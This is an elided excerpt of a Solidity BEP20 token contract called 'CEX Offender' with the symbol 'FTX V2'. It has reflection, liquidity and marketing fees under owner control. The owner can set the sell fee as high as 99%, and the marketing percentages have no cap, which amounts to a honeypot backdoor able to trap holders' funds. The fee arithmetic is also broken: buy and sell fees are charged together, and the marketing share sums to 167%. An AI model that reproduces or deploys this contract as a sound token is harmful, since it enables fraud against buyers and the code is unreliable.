...
abstract contract Context {
    ...
    function _marketingWlt() internal view virtual returns (address) {
        return 0x2bebFCcDD453C9A18AB9fc84b52920c1b310c0D4;
    }
}
...
contract TOKEN is Context, IBEP20, Ownable {
    ...
    uint256 private _tTotal = 9400000000 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name     = "CEX Offender";
    string private _symbol   = "FTX V2";
    uint8 private  _decimals = 9;

    uint256 public _taxFee = 0;
    uint256 public _buyliquidityFee = 5;
    uint256 public _sellliquidityFee = 15;
    uint256 public _percentageOfBuyLiquidityForMarketing = 80;
    uint256 public _percentageOfSellLiquidityForMarketing = 87;
    // uint256 public maxWalletToken = 940000000 * (10**9);
    uint256 public maxWalletToken = _tTotal;


    // uint256 public  _maxTxAmount     = 9400000000 * 10**9;
    uint256 public  _maxTxAmount     = _tTotal;
    uint256 private _minTokenBalance = 94 * 10**8;
    ...
    function setTaxFeePercent(uint256 taxFee) external onlyOwner {
        require(taxFee <= 10, "Holder Reflection cannot exceed 10%");
        _taxFee = taxFee;
    }

    function setBuyLiquidityFeePercent(uint256 buyliquidityFee) external onlyOwner {
        require(buyliquidityFee <= 15, "Buy Liquidity Fee cannot exceed 15%");
        _buyliquidityFee = buyliquidityFee;
    }

    function setSellLiquidityFeePercent(uint256 sellliquidityFee) external onlyOwner {
        require(sellliquidityFee <= 99, "Sell Liquidity Fee cannot exceed 99%");
        _sellliquidityFee = sellliquidityFee;
    }

    function setPercentageOfBuyLiquidityForMarketing(uint256 marketingFee) external onlyOwner {
        _percentageOfBuyLiquidityForMarketing = marketingFee;
    }

    function setPercentageOfSellLiquidityForMarketing(uint256 marketingFee) external onlyOwner {
        _percentageOfSellLiquidityForMarketing = marketingFee;
    }
    ...
    function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256) {
        ...
        uint256 tLiquidity = calculateFee(tAmount, _buyliquidityFee + _sellliquidityFee);
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        ...
        */
        ...
        // take marketing fee
        uint256 marketingFee          = newBalance.mul(_percentageOfBuyLiquidityForMarketing+_percentageOfSellLiquidityForMarketing).div(100);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
        ...
        uint256 previousBuyLiquidityFee = _buyliquidityFee;
        uint256 previousSellLiquidityFee = _sellliquidityFee;
        ...
        if (!takeFee) {
            ...
            _buyliquidityFee = previousBuyLiquidityFee;
            _sellliquidityFee = previousSellLiquidityFee;
        }
    }
